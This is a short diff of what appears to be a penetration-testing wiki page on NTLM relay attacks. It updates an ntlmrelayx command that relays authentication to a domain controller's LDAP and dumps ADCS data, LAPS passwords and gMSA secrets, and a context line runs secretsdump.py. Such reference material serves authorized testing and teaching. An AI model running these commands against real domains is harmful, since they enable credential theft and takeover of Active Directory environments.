@@ -113,10 +113,10 @@ proxychains secretsdump.py -no-pass $DOMAIN/$USER@$TARGET
 {% endtab %}
 
 {% tab title="Enum" %}
-The following command will run an enumeration of the Active Directory domain through the relayed authenticated session. The operation will create multiple `.html`, `.json` and `.grep` files.
+The following command will run an enumeration of the Active Directory domain through the relayed authenticated session. The operation will create multiple `.html`, `.json` and `.grep` files. It will also gather lots of information regarding the domain users and groups, the computers, [ADCS](../ad-cs/), etc.
 
 ```bash
-ntlmrelayx.py -t ldap://$DC_TARGET
+ntlmrelayx -t "ldap://domaincontroller" --dump-adcs --dump-laps --dump-gmsa
 ```
 {% endtab %}
 
